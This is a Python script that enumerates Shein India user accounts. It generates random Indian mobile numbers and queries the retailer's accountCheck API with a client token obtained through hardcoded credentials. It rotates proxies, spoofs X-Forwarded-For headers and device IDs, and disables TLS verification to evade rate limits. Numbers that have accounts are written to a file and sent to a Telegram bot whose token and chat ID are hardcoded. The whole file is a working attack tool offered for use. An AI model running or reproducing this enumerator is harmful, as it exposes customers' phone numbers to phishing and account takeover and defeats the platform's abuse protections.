#!/usr/bin/env python3
# ---------------------------------------------------------
# SHEIN INDIA SCANNER WITH STATIC PROXY ROTATION
# Uses only proxies from proxies.txt (ip:port:user:pass)
# ---------------------------------------------------------

import requests
import random
import time
import json
import os
from datetime import datetime
import binascii
import sys
import threading

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

# ================= CONFIGURATION =================
PROXY_FILE = "proxies.txt"           # Your working proxies
BOT_TOKEN = "8640844797:AAFcKQimH5JKm4X-dRoZab_QMAwEd4vVmWo"
CHAT_ID = "5799078736"
CHECK_DELAY = 0.1                     # seconds between checks
TOKEN_REFRESH_INTERVAL = 50            # refresh token every N checks

# ================= GLOBALS =================
proxy_list = []
proxy_index = 0
proxy_lock = threading.Lock()

# ================= LOAD PROXIES =================
def load_proxies():
    global proxy_list
    if not os.path.exists(PROXY_FILE):
        print(f"[!] Proxy file '{PROXY_FILE}' not found.")
        return False
    with open(PROXY_FILE, 'r') as f:
        lines = [line.strip() for line in f if line.strip()]
    for line in lines:
        # Expected format: ip:port:user:pass
        parts = line.split(':')
        if len(parts) == 4:
            proxy_list.append(line)
        else:
            print(f"[!] Skipping invalid line: {line}")
    print(f"[+] Loaded {len(proxy_list)} proxies from {PROXY_FILE}")
    return len(proxy_list) > 0

def get_next_proxy():
    global proxy_index
    with proxy_lock:
        if not proxy_list:
            return None
        proxy = proxy_list[proxy_index]
        proxy_index = (proxy_index + 1) % len(proxy_list)
        return proxy

def format_proxy(proxy_str):
    """Convert ip:port:user:pass to http://user:pass@ip:port"""
    ip, port, user, pwd = proxy_str.split(':')
    return f"http://{user}:{pwd}@{ip}:{port}"

# ================= TELEGRAM =================
def send_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": CHAT_ID, "text": message}, timeout=5)
    except:
        pass

# ================= COLORS =================
GREEN = "\033[1;32m" if os.name != 'nt' else ""
RED = "\033[1;31m" if os.name != 'nt' else ""
YELLOW = "\033[1;33m" if os.name != 'nt' else ""
RESET = "\033[0m" if os.name != 'nt' else ""

def print_banner():
    print(f"""{YELLOW}
   _____ __  __ ______ _____ _   _
  / ____|  \\/  |  ____|_   _| \\ | |
 | (___ | \\  / | |__    | | |  \\| |
  \\___ \\| |\\/| |  __|   | | | . ` |
  ____) | |  | | |____ _| |_| |\\  |
 |_____/|_|  |_|______|_____|_| \\_|
       PROXY ROTATOR v1 (Railway)
{RESET}""")

# ================= HELPER FUNCTIONS =================
def rand_ip():
    return f"{random.randint(11,199)}.{random.randint(10,250)}.{random.randint(10,250)}.{random.randint(1,250)}"

def gen_device_id():
    return binascii.hexlify(os.urandom(8)).decode()

def generate_indian_mobile():
    prefixes = ['99','98','97','96','93','90','88','89','87','70','79','78','63','62']
    return random.choice(prefixes) + str(random.randint(10000000, 99999999))

def http_call(url, data=None, headers=None, method="POST", proxy=None):
    if headers is None:
        headers = {}
    proxies = None
    if proxy:
        proxies = {'http': proxy, 'https': proxy}
    try:
        if method.upper() == "POST":
            r = requests.post(url, data=data, headers=headers, proxies=proxies,
                              timeout=10, verify=False)
        else:
            r = requests.get(url, headers=headers, proxies=proxies,
                             timeout=10, verify=False)
        return {'body': r.text, 'code': r.status_code}
    except Exception as e:
        return {'body': str(e), 'code': 0}

def get_client_token(proxy=None):
    url = "https://api.services.sheinindia.in/uaas/jwt/token/client"
    ad_id = gen_device_id()
    ip = rand_ip()
    headers = {
        "Accept": "application/json",
        "Accept-Encoding": "gzip",
        "Accept-Language": "en-IN,en;q=0.9",
        "Connection": "Keep-Alive",
        "User-Agent": "SHEIN/1.0.8 (Linux; Android 11; SM-G991B Build/RP1A.200720.012)",
        "Client_type": "Android/30",
        "Client_version": "1.0.8",
        "X-Tenant": "B2C",
        "X-Tenant-Id": "SHEIN",
        "Ad_id": ad_id,
        "X-Forwarded-For": ip,
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = "grantType=client_credentials&clientName=trusted_client&clientSecret=secret"
    res = http_call(url, data, headers, "POST", proxy)
    if res['code'] == 200:
        try:
            return json.loads(res['body']).get('access_token')
        except:
            pass
    return None

# ================= MAIN SCANNER =================
def main():
    print_banner()
    if not load_proxies():
        print(f"{RED}[!] No valid proxies. Exiting.{RESET}")
        sys.exit(1)

    count = 0
    hits = 0
    token = None
    proxy = None

    print(f"{GREEN}[+] Scanner started. Using {len(proxy_list)} proxies.{RESET}")

    try:
        while True:
            count += 1

            # Refresh token periodically
            if count % TOKEN_REFRESH_INTERVAL == 1 or not token:
                proxy_str = get_next_proxy()
                proxy = format_proxy(proxy_str) if proxy_str else None
                token = get_client_token(proxy)
                if not token:
                    print(f"{YELLOW}[!] Token refresh failed, retrying in 5s...{RESET}")
                    time.sleep(5)
                    continue
                print(f"[Token] Refreshed via {proxy_str}")

            # Get proxy for this check
            proxy_str = get_next_proxy()
            if not proxy_str:
                print(f"{RED}[!] No proxies available!{RESET}")
                time.sleep(10)
                continue
            proxy = format_proxy(proxy_str)

            # Mobile number logic (same as original)
            if count == 2:
                mobile = "6272882661"
            elif count == 4:
                mobile = "90682821398"
            else:
                mobile = generate_indian_mobile()

            # Prepare account check
            url = "https://api.services.sheinindia.in/uaas/accountCheck?client_type=Android%2F29&client_version=1.0.8"
            ad_id = gen_device_id()
            ip = rand_ip()
            headers = {
                "Authorization": f"Bearer {token}",
                "Accept": "application/json",
                "Accept-Encoding": "gzip",
                "Accept-Language": "en-IN,en;q=0.9",
                "Connection": "Keep-Alive",
                "User-Agent": "SHEIN/1.0.8 (Linux; Android 11; SM-G991B Build/RP1A.200720.012)",
                "Client_type": "Android/30",
                "Client_version": "1.0.8",
                "Requestid": "account_check",
                "X-Tenant": "B2C",
                "X-Tenant-Id": "SHEIN",
                "Ad_id": ad_id,
                "X-Forwarded-For": ip,
                "Content-Type": "application/x-www-form-urlencoded"
            }
            data = f"mobileNumber={mobile}"

            res = http_call(url, data, headers, "POST", proxy)

            # Parse response
            try:
                j = json.loads(res['body']) if res['body'] else {}
            except:
                j = {}

            if j.get('encryptedId'):
                hits += 1
                enc_id = j['encryptedId']
                print(f"{GREEN}[HIT] {mobile} via {proxy_str}{RESET}")
                # Save to file
                with open("valid.txt", "a") as f:
                    f.write(f"{mobile}\n")
                # Telegram alert
                send_telegram(mobile)
            else:
                if res['code'] == 429:
                    print(f"{YELLOW}[!] Rate limit (429) – pausing...{RESET}")
                    time.sleep(1)
                elif res['code'] in (401, 403):
                    print(f"{YELLOW}[!] Auth error – refreshing token{RESET}")
                    token = None
                else:
                    # Optional: print nothing or debug
                    pass

            time.sleep(CHECK_DELAY)

    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Stopped by user. Total hits: {hits}{RESET}")
        sys.exit(0)

if __name__ == "__main__":
    main()